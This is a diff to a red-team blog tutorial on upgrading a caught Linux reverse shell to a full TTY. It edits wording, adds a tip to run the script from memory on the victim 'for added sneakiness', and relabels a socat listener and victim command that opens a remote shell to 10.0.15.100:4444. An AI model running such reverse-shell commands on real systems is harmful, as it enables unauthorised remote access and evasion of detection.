@@ -4,16 +4,16 @@ description: >-
 title: Upgrade a linux reverse shell to a fully usable TTY shell                    # Add title of the machine here
 date: 2021-04-29 08:00:00 -0600                           # Change the date to match completion date
 categories: [Tips & Tricks]                     # Categories
-tags: [hacking, redteam, tips-n-tricks, python, linux, macos]     # TAG names should always be lowercase; add relevant tags
+tags: [hacking, redteam, tips-n-tricks, socat, expect, python, linux, macos]     # TAG names should always be lowercase; add relevant tags
 show_image_post: true                                    # Change this to true
 #image: /assets/img/                # Add image here for post preview image
 ---
 
 ![Hack responsibly disclaimer](/assets/markups/1-hack-responsibly.svg)
 
-## Upgrading remote shells
+## Upgrading remote shells (Unix machines only)
 
-After catching a shell through netcat, you are placed in a shell that has very limited functionality. If the remote machine has python or python3 installed you can easily upgrade to a fully functional TTY shell.
+Usually, after catching a shell through netcat you are placed in a shell that has very limited functionality. If the remote machine has python or python3 installed you can easily upgrade to a fully functional TTY shell.
 
  **Note:** To check if the shell is a TTY shell use the `tty` command.
  
@@ -101,15 +101,17 @@ spawn sh
 interact
 ```
 
+Then, execute this script on the victim machine.  For added sneakiness, run the script [from memory](https://zweilosec.github.io/posts/execute-in-memory/).
+
 ## Using socat
 
 Another option is to upload the binary for `socat` to the victim machine and magically get a fully interactive shell. Download the appropriate binaries from [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries). Socat needs to be on both machines for this to work.
 
 ```bash
-#Listener:
+#Create Listener on attack platform:
 socat file:`tty`,raw,echo=0 tcp-listen:4444
 
-#Victim:
+#From Victim:
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.15.100:4444
 ```
 
@@ -127,7 +129,7 @@ Note: The methods above will not work in every situation.  For example, I have r
 
 ## Other Examples
 
-If you have any other examples of methods of upgrading reverse shells, or have any other fun or useful tips or tricks, feel free to contact me on Github at https://github.com/zweilosec or on social media!
+If you have any other examples of methods of upgrading reverse shells, or have any other fun or useful tips or tricks, feel free to contact me on Github at [https://github.com/zweilosec](https://github.com/zweilosec) or on social media!
 
 If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=zweilosec&button_colour=FFDD00&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=ffffff"></a>
 
